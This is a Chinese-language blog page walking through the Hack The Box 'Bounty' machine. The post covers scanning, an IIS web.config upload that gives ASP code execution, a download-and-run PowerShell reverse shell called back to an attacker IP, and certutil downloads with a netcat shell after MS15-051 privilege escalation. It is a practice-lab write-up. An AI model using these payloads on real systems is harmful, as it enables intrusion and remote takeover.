@@ -1,0 +1,844 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>Bounty - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Hackthebox">
+    <meta name="description" content="Hackthebox - Bounty靶场信息                                                                                                            靶场类型">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bounty - Hackthebox">
+<meta property="og:url" content="http://www.lucifiel.com/2022/04/22/Hackthebox%20-%20Bounty/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="Hackthebox - Bounty靶场信息                                                                                                            靶场类型">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2022/04/22/Hackthebox%20-%20Bounty/a0ae619a-9c2b-42ed-90e6-4145a10d9e36.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/04/22/Hackthebox%20-%20Bounty/c568cfcf-ae66-4c3a-b7cf-08f38c9feeab.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/04/22/Hackthebox%20-%20Bounty/ecef5259-e729-4bd4-9c09-34791d0dd6f0.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/04/22/Hackthebox%20-%20Bounty/d1eb8957-4107-4be7-aa48-9b21dcb3d71d.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/04/22/Hackthebox%20-%20Bounty/b855bbeb-2c65-49c6-a002-ff20fd7c2542.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/04/22/Hackthebox%20-%20Bounty/0f58a9af-1dee-4df9-bbf4-42f209000f77.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/04/22/Hackthebox%20-%20Bounty/f5bf4d16-3a3d-4a67-951f-c2a79d93233e.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/04/22/Hackthebox%20-%20Bounty/3ffe6028-8d90-4e87-8664-d979a5799b34.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/04/22/Hackthebox%20-%20Bounty/1b35566e-f9f1-4ad7-b16b-96c0c1bac2f8.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/04/22/Hackthebox%20-%20Bounty/124031ef-b2c4-4220-963f-82c6a27c1446.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/04/22/Hackthebox%20-%20Bounty/6d4a1396-e4a5-485c-9641-8363fe689610.png">
+<meta property="article:published_time" content="2022-04-22T11:38:36.000Z">
+<meta property="article:modified_time" content="2023-05-20T01:25:28.494Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2022/04/22/Hackthebox%20-%20Bounty/a0ae619a-9c2b-42ed-90e6-4145a10d9e36.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Bounty - Hackthebox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Bounty - Hackthebox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2022-04-22T11:38:36.000Z" itemprop="datePublished" class="page-time">
+  2022-04-22
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Bounty"><span class="post-toc-number">1.</span> <span class="post-toc-text">Hackthebox - Bounty</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-number">2.</span> <span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-number">3.</span> <span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#信息收集"><span class="post-toc-number">4.</span> <span class="post-toc-text">信息收集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Http"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">Http</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Fuzz"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">Fuzz</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-number">5.</span> <span class="post-toc-text">漏洞利用</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Step-1"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">Step 1</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Step-2"><span class="post-toc-number">5.2.</span> <span class="post-toc-text">Step 2</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Step-3"><span class="post-toc-number">5.3.</span> <span class="post-toc-text">Step 3</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#权限提升"><span class="post-toc-number">6.</span> <span class="post-toc-text">权限提升</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#其他"><span class="post-toc-number">7.</span> <span class="post-toc-text">其他</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hackthebox - Bounty"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Bounty - Hackthebox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2022-04-22 19:38:36" datetime="2022-04-22T11:38:36.000Z"  itemprop="datePublished">2022-04-22</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Hackthebox-Bounty"><a href="#Hackthebox-Bounty" class="headerlink" title="Hackthebox - Bounty"></a>Hackthebox - Bounty</h1><h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h1><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/04/22/Hackthebox%20-%20Bounty/a0ae619a-9c2b-42ed-90e6-4145a10d9e36.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h1><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/04/22/Hackthebox%20-%20Bounty/c568cfcf-ae66-4c3a-b7cf-08f38c9feeab.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre><code class="bash">┌──(root💀lucifiel)-[~]
+└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.93
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-20 16:39 CST
+Nmap scan report for 10.10.10.93
+Host is up (0.38s latency).
+Not shown: 65534 filtered ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 7.5
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: Bounty
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|phone|specialized
+Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
+OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
+Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   342.38 ms 10.10.16.1
+2   513.76 ms 10.10.10.93
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 57.51 seconds
+</code></pre>
+<h2 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/04/22/Hackthebox%20-%20Bounty/ecef5259-e729-4bd4-9c09-34791d0dd6f0.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>http 里也没什么东西，去 fuzz 一下看看</p>
+<h2 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h2><pre><code class="bash">┌──(root💀lucifiel)-[~]
+└─# gobuster dir -u http://10.10.10.93/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 200 --no-error
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.93/
+[+] Method:                  GET
+[+] Threads:                 200
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/04/20 16:44:18 Starting gobuster in directory enumeration mode
+===============================================================
+/UploadedFiles        (Status: 301) [Size: 156] [--&gt; http://10.10.10.93/UploadedFiles/]
+
+===============================================================
+2022/04/20 16:47:53 Finished
+===============================================================
+</code></pre>
+<p>有一个目录，访问一下</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/04/22/Hackthebox%20-%20Bounty/d1eb8957-4107-4be7-aa48-9b21dcb3d71d.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>403 了，通过 nmap 得知这是 windows 系统下的 iis 搭建的网站，让我们尝试一下用 -x 扫描 aspx 格式的网页</p>
+<pre><code class="bash">┌──(root💀lucifiel)-[~]
+└─# gobuster dir -u http://10.10.10.93/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 500 --no-error -x aspx
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.93/
+[+] Method:                  GET
+[+] Threads:                 500
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              aspx
+[+] Timeout:                 10s
+===============================================================
+2022/04/20 16:57:38 Starting gobuster in directory enumeration mode
+===============================================================
+/transfer.aspx        (Status: 200) [Size: 941]
+
+===============================================================
+2022/04/20 16:59:36 Finished
+===============================================================
+</code></pre>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/04/22/Hackthebox%20-%20Bounty/b855bbeb-2c65-49c6-a002-ff20fd7c2542.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>我们扫描到一个文件上传的页面</p>
+<p>随便上传张图片试试看</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/04/22/Hackthebox%20-%20Bounty/0f58a9af-1dee-4df9-bbf4-42f209000f77.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>这里显示上传成功，去访问一下看看能不能访问到</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/04/22/Hackthebox%20-%20Bounty/f5bf4d16-3a3d-4a67-951f-c2a79d93233e.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>可以访问到，但是大概一分钟左右就会被自动删除</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/04/22/Hackthebox%20-%20Bounty/3ffe6028-8d90-4e87-8664-d979a5799b34.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>尝试上传了一个aspx文件，这次上传失败了</p>
+<p>去搜了一下相关的漏洞，倒是搜到了一些漏洞</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/04/22/Hackthebox%20-%20Bounty/1b35566e-f9f1-4ad7-b16b-96c0c1bac2f8.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<blockquote>
+<p><a href="https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/" target="_blank" rel="noopener">https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/</a></p>
+</blockquote>
+<p>去利用吧</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><pre><code class="bash">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;configuration&gt;
+   &lt;system.webServer&gt;
+      &lt;handlers accessPolicy=&quot;Read, Script, Write&quot;&gt;
+         &lt;add name=&quot;web_config&quot; path=&quot;*.config&quot; verb=&quot;*&quot; modules=&quot;IsapiModule&quot; scriptProcessor=&quot;%windir%\system32\inetsrv\asp.dll&quot; resourceType=&quot;Unspecified&quot; requireAccess=&quot;Write&quot; preCondition=&quot;bitness64&quot; /&gt;         
+      &lt;/handlers&gt;
+      &lt;security&gt;
+         &lt;requestFiltering&gt;
+            &lt;fileExtensions&gt;
+               &lt;remove fileExtension=&quot;.config&quot; /&gt;
+            &lt;/fileExtensions&gt;
+            &lt;hiddenSegments&gt;
+               &lt;remove segment=&quot;web.config&quot; /&gt;
+            &lt;/hiddenSegments&gt;
+         &lt;/requestFiltering&gt;
+      &lt;/security&gt;
+   &lt;/system.webServer&gt;
+&lt;/configuration&gt;
+&lt;!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
+&lt;%
+Response.write(&quot;-&quot;&amp;&quot;-&gt;&quot;)
+&#39; it is running the ASP code if you can see 3 by opening the web.config file!
+Response.write(1+2)
+Response.write(&quot;&lt;!-&quot;&amp;&quot;-&quot;)
+%&gt;
+--&gt;
+</code></pre>
+<p>将这段文件代码保存为 web.config 然后上传，去查看后如果看到了 “3” 则表示 payload 被执行了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/04/22/Hackthebox%20-%20Bounty/124031ef-b2c4-4220-963f-82c6a27c1446.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>确实执行成功了</p>
+<pre><code class="bash">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;configuration&gt;
+   &lt;system.webServer&gt;
+      &lt;handlers accessPolicy=&quot;Read, Script, Write&quot;&gt;
+         &lt;add name=&quot;web_config&quot; path=&quot;*.config&quot; verb=&quot;*&quot; modules=&quot;IsapiModule&quot; scriptProcessor=&quot;%windir%\system32\inetsrv\asp.dll&quot; resourceType=&quot;Unspecified&quot; requireAccess=&quot;Write&quot; preCondition=&quot;bitness64&quot; /&gt;         
+      &lt;/handlers&gt;
+      &lt;security&gt;
+         &lt;requestFiltering&gt;
+            &lt;fileExtensions&gt;
+               &lt;remove fileExtension=&quot;.config&quot; /&gt;
+            &lt;/fileExtensions&gt;
+            &lt;hiddenSegments&gt;
+               &lt;remove segment=&quot;web.config&quot; /&gt;
+            &lt;/hiddenSegments&gt;
+         &lt;/requestFiltering&gt;
+      &lt;/security&gt;
+   &lt;/system.webServer&gt;
+&lt;/configuration&gt;
+&lt;!-- 
+&lt;%
+Set rs = CreateObject(&quot;WScript.Shell&quot;)
+Set cmd = rs.Exec(&quot;cmd /c whoami&quot;)
+o = cmd.StdOut.readall()
+Response.write(o)
+%&gt;
+--&gt;
+</code></pre>
+<p>修改一个 POC，然后上传</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/04/22/Hackthebox%20-%20Bounty/6d4a1396-e4a5-485c-9641-8363fe689610.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>这里成功返回了我们要的东西</p>
+<p>来明确一下攻击路径</p>
+<h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>使用 nishang 来进行 getshell</p>
+<blockquote>
+<p><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" target="_blank" rel="noopener">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</a></p>
+</blockquote>
+<p>然后在最后一行加入下面的代码</p>
+<pre><code class="bash">Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 4444
+</code></pre>
+<h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>然后构造好 web.config 中的语句</p>
+<pre><code class="bash">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;configuration&gt;
+   &lt;system.webServer&gt;
+      &lt;handlers accessPolicy=&quot;Read, Script, Write&quot;&gt;
+         &lt;add name=&quot;web_config&quot; path=&quot;*.config&quot; verb=&quot;*&quot; modules=&quot;IsapiModule&quot; scriptProcessor=&quot;%windir%\system32\inetsrv\asp.dll&quot; resourceType=&quot;Unspecified&quot; requireAccess=&quot;Write&quot; preCondition=&quot;bitness64&quot; /&gt;         
+      &lt;/handlers&gt;
+      &lt;security&gt;
+         &lt;requestFiltering&gt;
+            &lt;fileExtensions&gt;
+               &lt;remove fileExtension=&quot;.config&quot; /&gt;
+            &lt;/fileExtensions&gt;
+            &lt;hiddenSegments&gt;
+               &lt;remove segment=&quot;web.config&quot; /&gt;
+            &lt;/hiddenSegments&gt;
+         &lt;/requestFiltering&gt;
+      &lt;/security&gt;
+   &lt;/system.webServer&gt;
+&lt;/configuration&gt;
+&lt;!-- 
+&lt;%
+Set rs = CreateObject(&quot;WScript.Shell&quot;)
+Set cmd = rs.Exec(&quot;cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.2/Invoke-PowerShellTcp.ps1&#39;)&quot;)
+o = cmd.StdOut.readall()
+Response.write(o)
+%&gt;
+--&gt;
+</code></pre>
+<p>然后使用 nc 在本地监听一个端口</p>
+<pre><code class="bash">nc -nvlp 4444
+</code></pre>
+<p>接着使用 python3 开启一个 http 服务</p>
+<pre><code class="bash">python3 -m http.server 80
+</code></pre>
+<h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>上传并访问我们的 payload</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.10.10.93] 49158
+Windows PowerShell running as user BOUNTY$ on BOUNTY
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\windows\system32\inetsrv&gt;whoami
+bounty\merlin
+</code></pre>
+<p>成功拿到一个 shell</p>
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p>使用 systeminfo 查看一下系统信息</p>
+<pre><code class="bash">PS C:\windows\system32\inetsrv&gt; systeminfo
+
+Host Name:                 BOUNTY                                                                                                                                                                                   
+OS Name:                   Microsoft Windows Server 2008 R2 Datacenter                                                                                                                                              
+OS Version:                6.1.7600 N/A Build 7600                                                                                                                                                                  
+OS Manufacturer:           Microsoft Corporation                                                                                                                                                                    
+OS Configuration:          Standalone Server                                                                                                                                                                        
+OS Build Type:             Multiprocessor Free                                                                                                                                                                      
+Registered Owner:          Windows User                                                                                                                                                                             
+Registered Organization:                                                                                                                                                                                            
+Product ID:                55041-402-3606965-84760                                                                                                                                                                  
+Original Install Date:     5/30/2018, 12:22:24 AM                                                                                                                                                                   
+System Boot Time:          4/22/2022, 6:08:06 AM                                                                                                                                                                    
+System Manufacturer:       VMware, Inc.                                                                                                                                                                             
+System Model:              VMware Virtual Platform                                                                                                                                                                  
+System Type:               x64-based PC                                                                                                                                                                             
+Processor(s):              1 Processor(s) Installed.                                                                                                                                                                
+                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz                                                                                                                         
+BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018                                                                                                                                                
+Windows Directory:         C:\Windows                                                                                                                                                                               
+System Directory:          C:\Windows\system32                                                                                                                                                                      
+Boot Device:               \Device\HarddiskVolume1                                                                                                                                                                  
+System Locale:             en-us;English (United States)                                                                                                                                                            
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
+Total Physical Memory:     2,047 MB
+Available Physical Memory: 28 MB
+Virtual Memory: Max Size:  4,095 MB
+Virtual Memory: Available: 1,786 MB
+Virtual Memory: In Use:    2,309 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    WORKGROUP
+Logon Server:              N/A
+Hotfix(s):                 N/A
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) PRO/1000 MT Network Connection
+                                 Connection Name: Local Area Connection
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 10.10.10.93
+</code></pre>
+<p>没有补丁，那就直接 ms15-051 提权了</p>
+<blockquote>
+<p><a href="https://github.com/wikiZ/ms15--051" target="_blank" rel="noopener">https://github.com/wikiZ/ms15--051</a></p>
+</blockquote>
+<blockquote>
+<p><a href="https://github.com/vinsworldcom/NetCat64/releases/tag/1.11.6.4" target="_blank" rel="noopener">https://github.com/vinsworldcom/NetCat64/releases/tag/1.11.6.4</a></p>
+</blockquote>
+<p>这里的 shell 不太稳定，咱们先使用 msf 获取一个 shell 吧</p>
+<p>然后咱们使用 shell 执行下面两条命令</p>
+<pre><code class="bash">cd c:\users\merlin\desktop
+certutil -urlcache -split -f http://10.10.14.2/ms15-051.exe
+certutil -urlcache -split -f http://10.10.14.2/nc64.exe
+./ms15-051.exe &quot;./nc64.exe 10.10.14.2 5555 -e cmd.exe&quot;
+</code></pre>
+<p>然后使用 msf 开启监听</p>
+<pre><code class="bash">use exploit/multi/handler
+set lhost 10.10.14.2
+exploit
+</code></pre>
+<p>然后执行文件</p>
+<pre><code class="bash">&amp;&quot;C:\users\merlin\Desktop\shell.exe&quot;
+</code></pre>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# nc -nvlp 4444                                                                       1 ⨯
+listening on [any] 4444 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.10.10.93] 49181
+Windows PowerShell running as user BOUNTY$ on BOUNTY
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32&gt;whoami
+nt authority\system
+</code></pre>
+<p>成功得到 root 权限的 shell</p>
+<pre><code class="bash">PS C:\Windows\system32&gt; type c:/users/merlin/desktop/user.txt   
+66aee8a564d37a25796466f0699d7e8a
+PS C:\Windows\system32&gt; type c://users/administrator/desktop/root.txt
+a376f4044a2bd073ed0abf33f3b659f4
+</code></pre>
+<p>成功得到 user 和 root 权限的 flag 文件</p>
+<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>如果 ms15-051 一直卡顿，那可以试试 juicy-potato</p>
+<blockquote>
+<p><a href="https://github.com/ohpe/juicy-potato" target="_blank" rel="noopener">https://github.com/ohpe/juicy-potato</a></p>
+</blockquote>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/04/22/Hackthebox%20-%20Bounty/&title=《Bounty - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/04/22/Hackthebox%20-%20Bounty/&title=《Bounty - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/04/22/Hackthebox%20-%20Bounty/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Bounty - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/04/22/Hackthebox%20-%20Bounty/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
